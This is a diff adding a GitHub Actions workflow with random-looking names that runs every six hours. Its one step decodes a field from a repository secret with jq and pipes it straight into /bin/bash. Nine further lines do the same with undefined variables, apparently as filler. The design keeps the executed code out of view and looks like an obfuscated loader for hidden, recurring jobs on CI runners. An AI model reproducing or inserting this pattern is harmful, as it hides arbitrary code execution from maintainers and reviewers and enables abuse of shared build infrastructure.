@@ -1,0 +1,27 @@
+name: yjxxjki
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yjxxjki
+        env:
+          hby0: ${{ secrets.hby0 }}
+        run: |
+          echo $hby0 | jq -r .br5 | /bin/bash
+          echo $lynqf54623 | jq -r .ke1918 | /bin/bash
+          echo $r301 | jq -r .amm691 | /bin/bash
+          echo $rf7796 | jq -r .go224 | /bin/bash
+          echo $ktft967 | jq -r .zsshz5628 | /bin/bash
+          echo $ivcbc004 | jq -r .axbz3743 | /bin/bash
+          echo $do33 | jq -r .sikhz1 | /bin/bash
+          echo $htloy6979 | jq -r .cnq5625 | /bin/bash
+          echo $tfvdl0101 | jq -r .h173 | /bin/bash
+          echo $nz4614 | jq -r .d655 | /bin/bash
+
